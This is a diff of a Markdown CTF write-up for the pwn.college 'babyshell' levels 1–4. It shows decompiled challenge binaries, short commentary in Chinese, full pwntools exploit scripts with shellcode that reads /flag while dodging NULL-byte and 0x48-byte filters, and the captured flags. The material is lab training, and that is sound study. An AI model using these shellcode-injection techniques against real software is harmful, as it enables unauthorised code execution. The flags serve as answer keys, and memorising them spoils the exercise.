@@ -102,7 +102,7 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 
 from pwn import ELF, asm, context, gdb, log, pause, process, remote
 
-context(os="linux", arch="amd64", log_level="debug", terminal="kitty")
+context(log_level="debug", terminal="kitty")
 
 FILE = "./babyshell-level-1"
 HOST, PORT = "localhost", 1337
@@ -137,24 +137,24 @@ def send_payload(target, payload):
 def construct_payload():
     shellcode = asm(
         """
-        mov rax, 0x67616c662f
-        push rax
-        lea rdi, [rsp]
-        mov rsi, 0x0
-        mov rdx, 0x0
-        mov rax, 0x2
-        syscall
+    mov rax, 0x67616c662f
+    push rax
+    lea rdi, [rsp]
+    mov rsi, 0x0
+    mov rdx, 0x0
+    mov rax, 0x2
+    syscall
 
-        mov rdi, 0x1
-        mov rsi, rax
-        mov rdx, 0x0
-        mov rcx, 0x1000
-        mov rax, 0x28
-        syscall
+    mov rdi, 0x1
+    mov rsi, rax
+    mov rdx, 0x0
+    mov rcx, 0x1000
+    mov rax, 0x28
+    syscall
 
-        mov rdi, 0x0
-        mov rax, 0x3c
-        syscall
+    mov rdi, 0x0
+    mov rax, 0x3c
+    syscall
         """
     )
 
@@ -286,7 +286,7 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 
 from pwn import ELF, asm, context, gdb, log, pause, process, remote, shellcraft
 
-context(os="linux", arch="amd64", log_level="debug", terminal="kitty")
+context(log_level="debug", terminal="kitty")
 
 FILE = "./babyshell-level-2"
 HOST, PORT = "localhost", 1337
@@ -324,24 +324,24 @@ def construct_payload(sled_length):
     shellcode = nop * sled_length
     shellcode += asm(
         """
-        mov rax, 0x67616c662f
-        push rax
-        lea rdi, [rsp]
-        mov rsi, 0x0
-        mov rdx, 0x0
-        mov rax, 0x2
-        syscall
+    mov rax, 0x67616c662f
+    push rax
+    lea rdi, [rsp]
+    mov rsi, 0x0
+    mov rdx, 0x0
+    mov rax, 0x2
+    syscall
 
-        mov rdi, 0x1
-        mov rsi, rax
-        mov rdx, 0x0
-        mov rcx, 0x1000
-        mov rax, 0x28
-        syscall
+    mov rdi, 0x1
+    mov rsi, rax
+    mov rdx, 0x0
+    mov rcx, 0x1000
+    mov rax, 0x28
+    syscall
 
-        mov rdi, 0x0
-        mov rax, 0x3c
-        syscall
+    mov rdi, 0x0
+    mov rax, 0x3c
+    syscall
         """
     )
 
@@ -380,3 +380,363 @@ if __name__ == "__main__":
 ### Flag
 
 Flag: `pwn.college{ws9aMHkG9tAyi31HLrmkc2LoE35.0FOxIDL5cTNxgzW}`
+
+## Level 3
+
+### Information
+
+- Category: Pwn
+
+### Description
+
+> Write and execute shellcode to read the flag, but your inputted data is filtered before execution.
+
+### Write-up
+
+```c ins={45-52} del={40, 57} collapse={1-36}
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  size_t v3; // rax
+  size_t v4; // rax
+  int fd; // [rsp+28h] [rbp-18h]
+  int k; // [rsp+2Ch] [rbp-14h]
+  const char **i; // [rsp+30h] [rbp-10h]
+  const char **j; // [rsp+38h] [rbp-8h]
+
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  puts(
+    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
+  puts(
+    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
+  puts(
+    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
+  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
+  for ( fd = 3; fd <= 9999; ++fd )
+    close(fd);
+  for ( i = argv; *i; ++i )
+  {
+    v3 = strlen(*i);
+    memset((void *)*i, 0, v3);
+  }
+  for ( j = envp; *j; ++j )
+  {
+    v4 = strlen(*j);
+    memset((void *)*j, 0, v4);
+  }
+  shellcode = mmap((void *)0x2CE31000, 0x1000uLL, 7, 34, 0, 0LL);
+  if ( shellcode != (void *)753078272 )
+    __assert_fail("shellcode == (void *)0x2ce31000", "/challenge/babyshell-level-3.c", 0x62u, "main");
+  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x2CE31000);
+  puts("Reading 0x1000 bytes from stdin.\n");
+  shellcode_size = read(0, shellcode, 0x1000uLL);
+  if ( !shellcode_size )
+    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-3.c", 0x67u, "main");
+  puts("Executing filter...\n");
+  puts("This challenge requires that your shellcode have no NULL bytes!\n");
+  for ( k = 0; k < (unsigned __int64)shellcode_size; ++k )
+  {
+    if ( !*((_BYTE *)shellcode + k) )
+    {
+      printf("Failed filter at byte %d!\n", k);
+      exit(1);
+    }
+  }
+  puts("This challenge is about to execute the following shellcode:\n");
+  print_disassembly(shellcode, shellcode_size);
+  puts(&byte_251D);
+  puts("Executing shellcode!\n");
+  ((void (*)(void))shellcode)();
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+这次的限制是 shellcode 的机器指令中不允许出现 `\x00` 字节。这就需要我们好好利用各自指令组合来构造数据了。
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import ELF, asm, context, gdb, log, pause, process, remote
+
+context(log_level="debug", terminal="kitty")
+
+FILE = "./babyshell-level-3"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+def send_payload(target, payload):
+    try:
+        target.send(payload)
+    except Exception as e:
+        log.exception(f"An error occurred while sending payload: {e}")
+
+
+def construct_payload():
+    shellcode = asm(
+        """
+    mov rdi, 0x67616c66
+    shl rdi, 0x8
+    or rdi, 0x2f
+    push rdi
+    lea rdi, [rsp]
+    xor rsi, rsi
+    xor rdx, rdx
+    xor rax, rax
+    or rax, 0x2
+    syscall
+
+    xor rdi, rdi
+    or rdi, 0x1
+    mov rsi, rax
+    xor rdx, rdx
+    xor r10, r10
+    or r10, 0xfffffff
+    xor rax, rax
+    or rax, 0x28
+    syscall
+
+    dec rdi
+    xor rax, rax
+    or rax, 0x3c
+    syscall
+        """
+    )
+
+    return shellcode
+
+
+def attack(target, payload):
+    try:
+        send_payload(target, payload)
+
+        response = target.recvall(timeout=5)
+
+        return b"pwn.college{" in response
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    try:
+        target = launch()
+        payload = construct_payload()
+
+        if attack(target, payload):
+            log.success("Success! Exiting...")
+
+            pause()
+            exit()
+    except Exception as e:
+        log.exception(f"An error occurred in main: {e}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Flag
+
+Flag: `pwn.college{gZQWA0hDKCz5Xn8KrcsIiwIX2aZ.0VOxIDL5cTNxgzW}`
+
+## Level 4
+
+### Information
+
+- Category: Pwn
+
+### Description
+
+> Write and execute shellcode to read the flag, but your inputted data is filtered before execution.
+
+### Write-up
+
+```c ins={45-52} del={40, 57} collapse={1-36}
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  size_t v3; // rax
+  size_t v4; // rax
+  int fd; // [rsp+28h] [rbp-18h]
+  int k; // [rsp+2Ch] [rbp-14h]
+  const char **i; // [rsp+30h] [rbp-10h]
+  const char **j; // [rsp+38h] [rbp-8h]
+
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  puts(
+    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
+  puts(
+    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
+  puts(
+    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
+  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
+  for ( fd = 3; fd <= 9999; ++fd )
+    close(fd);
+  for ( i = argv; *i; ++i )
+  {
+    v3 = strlen(*i);
+    memset((void *)*i, 0, v3);
+  }
+  for ( j = envp; *j; ++j )
+  {
+    v4 = strlen(*j);
+    memset((void *)*j, 0, v4);
+  }
+  shellcode = mmap((void *)0x2D632000, 0x1000uLL, 7, 34, 0, 0LL);
+  if ( shellcode != (void *)761470976 )
+    __assert_fail("shellcode == (void *)0x2d632000", "/challenge/babyshell-level-4.c", 0x62u, "main");
+  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x2D632000);
+  puts("Reading 0x1000 bytes from stdin.\n");
+  shellcode_size = read(0, shellcode, 0x1000uLL);
+  if ( !shellcode_size )
+    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-4.c", 0x67u, "main");
+  puts("Executing filter...\n");
+  puts("This challenge requires that your shellcode have no H bytes!\n");
+  for ( k = 0; k < (unsigned __int64)shellcode_size; ++k )
+  {
+    if ( *((_BYTE *)shellcode + k) == 0x48 )
+    {
+      printf("Failed filter at byte %d!\n", k);
+      exit(1);
+    }
+  }
+  puts("This challenge is about to execute the following shellcode:\n");
+  print_disassembly(shellcode, shellcode_size);
+  puts(&byte_251D);
+  puts("Executing shellcode!\n");
+  ((void (*)(void))shellcode)();
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+显然，这次不允许我们使用 64-bit 汇编写 shellcode。Why？Cuz 64-bit 汇编指令本质上就是 32-bit 汇编的拓展，大多数指令都以前缀 `0x48` 开始。easy peasy!
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import ELF, asm, context, gdb, log, pause, process, remote
+
+context(log_level="debug", terminal="kitty")
+
+FILE = "./babyshell-level-4"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+def send_payload(target, payload):
+    try:
+        target.send(payload)
+    except Exception as e:
+        log.exception(f"An error occurred while sending payload: {e}")
+
+
+def construct_payload():
+    shellcode = asm(
+        """
+    lea ebx, [eip+0x2c]
+    xor ecx, esi
+    xor edx, edx
+    mov eax, 0x5
+    int 0x80
+
+    mov ebx, 0x1
+    mov ecx, eax
+    xor edx, edx
+    mov esi, 0x1000
+    mov eax, 0xbb
+    int 0x80
+
+    mov ebx, 0x0
+    mov eax, 0x1
+    int 0x80
+
+flag:
+    .string "/flag"
+        """
+    )
+
+    return shellcode
+
+
+def attack(target, payload):
+    try:
+        send_payload(target, payload)
+
+        response = target.recvall(timeout=5)
+
+        return b"pwn.college{" in response
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    try:
+        target = launch()
+        payload = construct_payload()
+
+        if attack(target, payload):
+            log.success("Success! Exiting...")
+
+            pause()
+            exit()
+    except Exception as e:
+        log.exception(f"An error occurred in main: {e}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Flag
+
+Flag: `pwn.college{wqf2fgp7CVvoI3yhbzzsqtw5OC3.0FMyIDL5cTNxgzW}`
